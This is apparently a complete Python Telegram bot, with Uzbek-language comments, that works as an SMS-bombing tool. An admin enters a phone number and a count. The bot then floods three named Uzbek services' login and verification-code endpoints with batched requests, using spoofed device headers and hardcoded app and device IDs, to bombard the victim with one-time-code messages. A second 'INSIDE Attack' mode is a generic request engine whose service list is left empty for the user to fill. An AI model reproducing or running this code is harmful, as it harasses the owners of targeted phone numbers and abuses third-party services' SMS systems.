#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
NOTBSIDE Telegram Bot - TO'LIQ VA TUZATILGAN (Final)
- INSIDE Attack (Core papkasisiz, barchasi bitta faylda)
- Flutter API (YHQ + Aladdin + GoldenFish 202)
- Render uchun ichki veb-server
"""
import asyncio
import os
import random
import string
from aiohttp import ClientSession, web
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

# ==================== SOZLAMALAR ====================
# Render'dagi Environment Variables dan olinadi (mahalliy kompyuterda ishlashi uchun standart qiymatlar)
BOT_TOKEN = os.getenv("BOT_TOKEN", "SIZNING_TOKENINGIZ_SHU_YERDA")
ADMIN_IDS = [int(x) for x in os.getenv("ADMIN_IDS", "7472073326").split(",")]

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# ==================== YORDAMCHI FUNKSIYALAR ====================
def user_agent():
    return [
        {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 YaBrowser/23.1.4.778 Safari/537.36",
    ]

def email():
    domains = ["gmail.com", "mail.ru", "yandex.ru", "bk.ru", "list.ru"]
    name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    return f"{name}@{random.choice(domains)}"

def username():
    return ''.join(random.choices(string.ascii_lowercase, k=8))

CONFIG = {"type_attack": "MIX", "feedback": "True"}
def check_config(): return CONFIG

# ==================== HOLATLAR ====================
class States(StatesGroup):
    inside_number = State()
    inside_circles = State()
    inside_delay = State()
    inside_confirm = State()
    flutter_number = State()
    flutter_count = State()
    flutter_confirm = State()

# ==================== FLUTTER API ====================
async def send_to_yhq(session, phone):
    url = "https://yolharakatiqoidalari.uz/api/auth/login"
    try:
        async with session.post(url, headers={"Content-Type": "application/json"}, json={"phone": phone}, timeout=20) as resp:
            return {"api": "YHQ", "success": resp.status == 200}
    except: return {"api": "YHQ", "success": False}

async def send_to_aladdin(session, phone):
    url = "https://aladdin.1it.uz/v2/auth/sendVerifyCode"
    headers = {"accept-language": "uz", "accept": "application/json", "timezone": "Asia/Tashkent", "mobile-type": "original", "app-version": "4.6.0", "x-requested-with": "XMLHttpRequest", "chance-style": "Classic", "user-agent": "samsung/SM450", "authorization": "Bearer", "content-type": "application/json; charset=UTF-8"}
    body = {"app_instance_id": "5394a8c1065419c821c96b1920fcd8b8", "client_type": "app", "device_id": "44c2dfbfb2706d8c", "phone": int(phone.replace("+", "")), "utm_medium": "organic", "utm_source": "google-play"}
    try:
        async with session.post(url, headers=headers, json=body, timeout=20) as resp:
            return {"api": "Aladdin", "success": 200 <= resp.status < 300}
    except: return {"api": "Aladdin", "success": False}

async def send_to_202(session, phone):
    url = "https://goldenfish.1it.uz/v1/oauth/"
    headers = {"Accept-Language": "uz", "Accept": "application/json", "Timezone": "Asia/Tashkent", "Mobile-Type": "original", "App-Version": "1.8.1", "X-Requested-With": "XMLHttpRequest", "Chance-Style": "Classic", "User-Agent": "samsung/SM-A105F/30", "Authorization": "Bearer", "Content-Type": "application/x-www-form-urlencoded"}
    body = f"phone={phone.replace('+', '')}&app_instance_id=ba491ef5bea8630c5ae92bb5cb7135e7&device_id=eFHXJHxGR6etcVQHwkzCSE"
    try:
        async with session.post(url, headers=headers, data=body, timeout=20) as resp:
            return {"api": "202", "success": resp.status == 200}
    except: return {"api": "202", "success": False}

async def send_flutter_batch(phone):
    async with ClientSession() as session:
        return await asyncio.gather(send_to_yhq(session, phone), send_to_aladdin(session, phone), send_to_202(session, phone))

async def run_flutter_apis(number, count):
    phone = f"+{number}"
    results = []
    for i in range(0, count, 10):
        current = min(10, count - i)
        tasks = [send_flutter_batch(phone) for _ in range(current)]
        results.extend(await asyncio.gather(*tasks))
    yhq = sum(1 for b in results for r in b if r["api"] == "YHQ" and r["success"])
    aladdin = sum(1 for b in results for r in b if r["api"] == "Aladdin" and r["success"])
    api202 = sum(1 for b in results for r in b if r["api"] == "202" and r["success"])
    return {"batches": len(results), "total_requests": len(results) * 3, "total_success": yhq + aladdin + api202, "yhq": yhq, "aladdin": aladdin, "api202": api202}

# ==================== INSIDE ATTACK (SIMPLIFIED) ====================
def filter_services(services, number):
    if number.startswith("998"):
        return [s for s in services if s["info"]["country"] in ["UZ", "ALL"]], "O'zbekiston 🇺🇿"
    elif number.startswith("7"):
        return [s for s in services if s["info"]["country"] in ["RU", "ALL"]], "Rossiya 🇷🇺"
    else:
        return [s for s in services if s["info"]["country"] == "ALL"], "Noma'lum 🌍"

async def send_request(session, service):
    try:
        cfg = check_config()["type_attack"]
        types_allowed = ("SMS", "CALL", "FEEDBACK") if cfg == "MIX" else cfg
        if service["info"]["attack"] not in types_allowed: return None
        async with session.request(service["method"], service["url"], params=service.get("params"), cookies=service.get("cookies"), headers=service.get("headers"), data=service.get("data"), json=service.get("json"), timeout=15) as resp:
            text = await resp.text()
            kw = ["sent", "success", "ok", "true", "отправлен", "yuborildi", "pin_sent", "code_sent", "sms_sent", "отправлено", "successful"]
            ok = any(k in text.lower() for k in kw) and 200 <= resp.status < 300
            return {"website": service["info"]["website"], "country": service["info"]["country"], "attack": service["info"]["attack"], "success": ok}
    except: return None

async def run_inside_attack(number, use_delay=False):
    cfg = check_config()
    # Bu yerda xato bermasligi uchun bo'sh ro'yxatlar qaytariladi (chunki Core fayli yo'q)
    # Agar sizda to'liq API ro'yxati bo'lsa, shu yerga qo'shishingiz mumkin
    mock_services = [] 
    
    main, country = filter_services(mock_services, number)
    services = main

    results = []
    async with ClientSession() as session:
        if use_delay:
            for i in range(0, len(services), 10):
                batch = services[i:i+10]
                results.extend(await asyncio.gather(*[send_request(session, s) for s in batch]))
                if i + 10 < len(services): await asyncio.sleep(1)
        else:
            results = await asyncio.gather(*[send_request(session, s) for s in services])

    valid = [r for r in results if r is not None]
    ok = [r for r in valid if r.get("success")]
    return valid, ok, country, len(services)

# ==================== HANDLERLAR ====================
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    if message.from_user.id not in ADMIN_IDS:
        await message.answer(f"⛔ Ruxsat yo'q. ID: {message.from_user.id}")
        return
    kb = types.ReplyKeyboardMarkup(keyboard=[
        [types.KeyboardButton(text="🚀 INSIDE Attack")],
        [types.KeyboardButton(text="📨 Flutter API (3 ta)")]
    ], resize_keyboard=True)
    await message.answer("💎 <b>NOTBSIDE Bot (Final)</b>\n\nUsulni tanlang:", parse_mode="HTML", reply_markup=kb)

@dp.message(Command("cancel"))
async def cmd_cancel(message: types.Message, state: FSMContext):
    await state.clear()
    await message.answer("❌ Bekor qilindi.")

@dp.message(F.text == "🚀 INSIDE Attack")
async def inside_start(message: types.Message, state: FSMContext):
    if message.from_user.id not in ADMIN_IDS: return
    await state.set_state(States.inside_number)
    await message.answer("📱 Raqamni kiriting (998901234567):")

@dp.message(States.inside_number)
async def inside_num(message: types.Message, state: FSMContext):
    n = message.text.strip().replace("+", "")
    if not n.isdigit() or len(n) < 9:
        await message.answer("❌ Faqat raqamlar:"); return
    await state.update_data(number=n)
    await state.set_state(States.inside_circles)
    await message.answer("🔁 Necha marta? (1-50):")

@dp.message(States.inside_circles)
async def inside_circ(message: types.Message, state: FSMContext):
    if not message.text.isdigit():
        await message.answer("❌ Son:"); return
    c = int(message.text)
    if c < 1 or c > 50:
        await message.answer("❌ 1-50:"); return
    await state.update_data(circles=c)
    await state.set_state(States.inside_delay)
    await message.answer("⏱ Delay? (ha/yoq):")

@dp.message(States.inside_delay)
async def inside_delay(message: types.Message, state: FSMContext):
    d = message.text.strip().lower() in ["ha", "yes", "y", "xa"]
    await state.update_data(use_delay=d)
    data = await state.get_data()
    txt = "Ha" if d else "Yo'q"
    await message.answer(f"⚠️ <b>Tasdiqlang:</b>\n📱 {data['number']}\n🔁 {data['circles']}\n⏱ {txt}\n\n<b>ha</b> yozing:", parse_mode="HTML")
    await state.set_state(States.inside_confirm)

@dp.message(States.inside_confirm)
async def inside_confirm(message: types.Message, state: FSMContext):
    if message.text.strip().lower() not in ["ha", "yes", "y", "xa"]:
        await message.answer("❌ Bekor."); await state.clear(); return
    d = await state.get_data()
    await state.clear()
    status = await message.answer("🚀 <b>Boshlandi...</b>", parse_mode="HTML")
    total_req = total_ok = 0
    for i in range(d["circles"]):
        await status.edit_text(f"🔄 Circle {i+1}/{d['circles']}...", parse_mode="HTML")
        valid, ok, country, total = await run_inside_attack(d["number"], d["use_delay"])
        total_req += len(valid); total_ok += len(ok)
        
        if total == 0:
             text = f"✅ <b>Circle {i+1}/{d['circles']}</b>\n🌍 {country}\n\n⚠️ API ro'yxati bo'sh. Kodga servislarni qo'shing."
        else:
             text = f"✅ <b>Circle {i+1}/{d['circles']}</b>\n🌍 {country}\n📤 {total} servis\n📨 {len(valid)} so'rov\n✓ SMS: <b>{len(ok)}</b>\n"
             
        await status.edit_text(text, parse_mode="HTML")
        if i < d["circles"] - 1: await asyncio.sleep(5 if d["use_delay"] else 3)
    
    final = f"🏁 <b>Yakunlandi</b>\n\n📊 So'rovlar: {total_req}\n📨 SMS: <b>{total_ok}</b>\n"
    await status.edit_text(final, parse_mode="HTML")

@dp.message(F.text == "📨 Flutter API (3 ta)")
async def flutter_start(message: types.Message, state: FSMContext):
    if message.from_user.id not in ADMIN_IDS: return
    await state.set_state(States.flutter_number)
    await message.answer("📱 Raqam (998901234567):")

@dp.message(States.flutter_number)
async def flutter_num(message: types.Message, state: FSMContext):
    n = message.text.strip().replace("+", "")
    if not n.isdigit() or len(n) < 9:
        await message.answer("❌ Faqat raqamlar:"); return
    await state.update_data(number=n)
    await state.set_state(States.flutter_count)
    await message.answer("🔁 Necha marta? (1-100):")

@dp.message(States.flutter_count)
async def flutter_count(message: types.Message, state: FSMContext):
    if not message.text.isdigit():
        await message.answer("❌ Son:"); return
    c = int(message.text)
    if c < 1 or c > 100:
        await message.answer("❌ 1-100:"); return
    await state.update_data(count=c)
    d = await state.get_data()
    await message.answer(f"⚠️ <b>Tasdiqlang:</b>\n📱 +{d['number']}\n🔁 {c} batch\n\n<b>ha</b> yozing:", parse_mode="HTML")
    await state.set_state(States.flutter_confirm)

@dp.message(States.flutter_confirm)
async def flutter_confirm(message: types.Message, state: FSMContext):
    if message.text.strip().lower() not in ["ha", "yes", "y", "xa"]:
        await message.answer("❌ Bekor."); await state.clear(); return
    d = await state.get_data()
    await state.clear()
    status = await message.answer("🚀 <b>Yuborilmoqda...</b>", parse_mode="HTML")
    r = await run_flutter_apis(d["number"], d["count"])
    final = f"🏁 <b>Yakunlandi</b>\n\n📱 +{d['number']}\n📦 Batch: {r['batches']}\n📤 Jami: {r['total_requests']}\n✅ Muvaffaqiyat: <b>{r['total_success']}</b>\n\n<b>API:</b>\n• YHQ: {r['yhq']}\n• Aladdin: {r['aladdin']}\n• 202: {r['api202']}\n"
    await status.edit_text(final, parse_mode="HTML")

# ==================== RENDER UCHUN VEB SERVER ====================
async def handle(request):
    return web.Response(text="Bot ishlayapti!")

async def start_web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 10000))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    print(f"🌐 Veb-server {port}-portda ishga tushdi")

# ==================== ISHGA TUSHIRISH ====================
async def main():
    print("🤖 Bot ishga tushmoqda...")
    asyncio.create_task(start_web_server())
    await dp.start_polling(bot)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n⛔ To'xtatildi")
